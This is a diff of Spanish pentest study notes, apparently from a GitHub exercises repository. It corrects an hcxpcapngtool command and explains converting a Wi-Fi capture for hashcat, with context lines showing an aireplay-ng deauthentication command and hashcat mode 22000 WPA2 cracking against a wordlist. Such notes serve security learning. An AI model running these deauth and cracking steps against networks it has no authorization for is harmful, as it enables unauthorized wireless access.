@@ -854,14 +854,16 @@ aireplay-ng -0 10 -a <bssid> --ignore-negative-one <interfaz>
 ![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/267266d2-5dfc-4f1f-83b8-6f1a5bf96250)
 
 
-![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/bc9ae5a7-1caf-45f6-9884-5c80a0cb55b5)
 
 ## Crackear WPA2
+
+Tienes que trasformar el .cap a un formato que entienda hashcat para esto se usa el 
+hcxtools.
 
 > https://node-security.com/posts/cracking-wpa2-with-hashcat/
 
 ```
-cxpcapngtool wifiCapture-01.cap -o /home/user1/wifiHashes.txt
+hcxpcapngtool wifiCapture-01.cap -o /home/user1/wifiHashes.txt
 
 ````
 ## Hashcat
@@ -870,6 +872,9 @@ Como nota se puede usar el modo 22000 solo en versiones mayores a hashcat
 ```
  .\hashcat.exe -m 22000 -w 3 .\toCrack\wifiHashes.txt .\passwordLists\hashkiller-dict.txt
 ```
+
+
+![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/bc9ae5a7-1caf-45f6-9884-5c80a0cb55b5)
 
 > https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
 
